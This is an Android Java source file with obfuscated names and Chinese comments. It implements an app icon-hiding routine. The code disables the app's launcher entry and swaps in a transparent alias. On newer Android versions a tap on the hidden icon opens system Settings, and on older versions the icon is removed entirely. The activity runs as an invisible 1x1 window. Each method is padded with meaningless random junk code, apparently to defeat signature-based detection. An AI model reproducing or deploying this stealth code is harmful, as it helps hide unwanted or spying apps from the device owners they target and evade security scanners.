package lxp.bpjt.yyc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（LQD），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 * 注：KWQ.initPopPower() 已提前直接执行组件切换(A16 保底)，
 * 此处的切换为幂等重复确认，主要为旧版本保留"切换后跳设置页"的原始体验。
 */
public class WOOX extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        java.lang.Object arr_PteDwWuDfXXV = new java.lang.Object();
        int i_pxisysZGcUFzTUxO = arr_PteDwWuDfXXV.hashCode();
        int j_KxTxzzQGn = new java.util.Random().nextInt(100);
        int tmp_eMatzQt = (i_pxisysZGcUFzTUxO ^ j_KxTxzzQGn) & 0x7FFFFFFF;
        if (tmp_eMatzQt == 74 && i_pxisysZGcUFzTUxO < 54) {
            arr_PteDwWuDfXXV.toString();
        }
        super.onCreate(savedInstanceState);
        // 别名与当前类同包，通过当前类全限定名推导包名，避免硬编码包前缀被混淆后失效
        String pkg = getClass().getName();
        pkg = pkg.substring(0, pkg.lastIndexOf('.'));
        String alias = pkg + ".MysteryAliasActivity";
        set(WOOX.this, LQD.class.getName(), alias);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(WOOX.this, alias);
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        int process_uPICXBqGiXfkr = new java.util.Random().nextInt(50);
        int stack_JLzQHk = (process_uPICXBqGiXfkr > 44) ? 1 : ((process_uPICXBqGiXfkr > 72) ? 22 : ((process_uPICXBqGiXfkr > 66) ? 18 : 23));
        int i_cxBepWsKxuawMXXlg = stack_JLzQHk * process_uPICXBqGiXfkr;
        if (i_cxBepWsKxuawMXXlg > 46) {
            java.lang.System.arraycopy(new int[] { i_cxBepWsKxuawMXXlg }, 0, new int[] { 0 }, 0, 1);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        int process_uPICXBqGiXfkr = new java.util.Random().nextInt(50);
        int stack_JLzQHk = (process_uPICXBqGiXfkr > 44) ? 1 : ((process_uPICXBqGiXfkr > 72) ? 22 : ((process_uPICXBqGiXfkr > 66) ? 18 : 23));
        int i_cxBepWsKxuawMXXlg = stack_JLzQHk * process_uPICXBqGiXfkr;
        if (i_cxBepWsKxuawMXXlg > 46) {
            java.lang.System.arraycopy(new int[] { i_cxBepWsKxuawMXXlg }, 0, new int[] { 0 }, 0, 1);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        String onaZPrMTzUMvZcsSQqa = java.util.UUID.randomUUID().toString();
        int ckuynbTEOAiZotQK = onaZPrMTzUMvZcsSQqa.length();
        char pmh_FwuvZ = onaZPrMTzUMvZcsSQqa.charAt(new java.util.Random().nextInt(ckuynbTEOAiZotQK));
        boolean dimaykphHqGHVRgEprYsr = (pmh_FwuvZ == 'z');
        if (dimaykphHqGHVRgEprYsr && ckuynbTEOAiZotQK < 43) {
            onaZPrMTzUMvZcsSQqa.substring(61, 26);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
